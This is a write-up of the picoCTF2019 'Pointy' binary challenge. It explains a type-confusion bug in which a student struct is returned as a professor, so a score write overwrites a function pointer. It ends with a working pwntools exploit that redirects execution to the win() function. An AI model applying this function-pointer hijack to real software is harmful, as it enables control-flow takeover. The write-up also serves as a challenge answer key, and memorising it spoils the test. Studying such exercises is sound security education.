# Pointy (picoCTF2019)



#### What does this program do?

#### It will make a loop which will:

#### 1. Create a new student struct and ask for student name

#### 2. Create a new professor struct and ask for professer name

#### 3. Search for the student who will give a professor some point

#### 4. Search for the professor who will be given some point by the student chosen at step 3

#### 5. Give the professor point

#### We could clearly see there are some bugs in vuln.c right in the first place

```C
int main (int argc, char **argv)
{
    while(ADRESSES_TAKEN<MAX_ADDRESSES-1){
        printf("Input the name of a student\n");
        struct Student* student = (struct Student*)malloc(sizeof(struct Student));
        ADDRESSES[ADRESSES_TAKEN]=student;	//1: student struct was saved in ADDRESSES array
        readLine(student->name);
        printf("Input the name of the favorite professor of a student \n");
        struct Professor* professor = (struct Professor*)malloc(sizeof(struct Professor));
        ADDRESSES[ADRESSES_TAKEN+1]=professor;  //2: professer struct was also saved in ADDRESSES array
        readLine(professor->name);
        student->scoreProfessor=&giveScoreToProfessor; //3: student->scoreProfessor is a function pointer point to giveScoreToProfessor
        ADRESSES_TAKEN+=2;
        printf("Input the name of the student that will give the score \n");
        char  nameStudent[NAME_SIZE];
        readLine(nameStudent);
        student=(struct Student*) retrieveStudent(nameStudent);
        printf("Input the name of the professor that will be scored \n");
        char nameProfessor[NAME_SIZE];
        readLine(nameProfessor);
        professor=(struct Professor*) retrieveProfessor(nameProfessor); //4: struct professor's change depends on retrieveProfessor function
        puts(professor->name);
        unsigned int value;
            printf("Input the score: \n");
            scanf("%u", &value);
        student->scoreProfessor(professor, value); //5: point will be given through function scoreProfessor
    }
    return 0;
}
```
#### We can now sense some buggy smell throught that 4 place

```C
struct Professor {
    char name[NAME_SIZE];
    int lastScore;
};

struct Student {
    char name[NAME_SIZE];
    void (*scoreProfessor)(struct Professor*, int);
};
```
#### The offset of Student->scoreProfessor is the same as Professor->lastScore

```C
void* retrieveProfessor(char * name ){
    for(int i=0; i<ADRESSES_TAKEN;i++){
        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
            return ADDRESSES[i];
        }
    }
    puts("person not found... see you!");
    exit(0);
}
```
#### The struct student and professor are on the same array, but this `retrieveProfessor` doesnt check for name if the professor has the same name as the student, this is the critical bug!
#### So now if we input `A` as the student name, `A` as the professor name, `A` for the student that will give score (bypass the program check).
#### And finally `A` as the professor name, the `retrieveProfessor` will now try to search professor named `A` but the student named `A` is at the first index of the array, so the program will give the `professor`  struct variable the `student` struct, and then because the offset of `Student->scoreProfessor` is the same as `Professor->lastScore`, the program will change the function pointer `Student->scoreProfessor` to the number of point, this was performed in `giveScoreToProfessor` function of struct `student`.

```C
void giveScoreToProfessor(struct Professor* professor, int score){
    professor->lastScore=score; // professor->lastScore is actually student->scoreProfessor because the program chose the student struct as professor struct and professor->lastScore is the same offset as student->scoreProfessor
    printf("Score Given: %d \n", score);

}
```
And i got this final exploit:
```python
from pwn import *

io = process('./vuln')
elf = ELF('./vuln')

def givescore(student, teacher, StudentGiveScore, teacherBeingGivenScore, score):
        print(io.recv())
        io.sendline(student)
        print(io.recv())
        io.sendline(teacher)
        print(io.recv())
        io.sendline(StudentGiveScore)
        print(io.recv())
        io.sendline(teacherBeingGivenScore)
        print(io.recv())
        io.sendline(str(score))

givescore(b'A', b'A', b'A', b'A', elf.sym['win'])
givescore(b'lmao', b'bruh', b'A', b'bruh', 1)
print(io.recv())
```
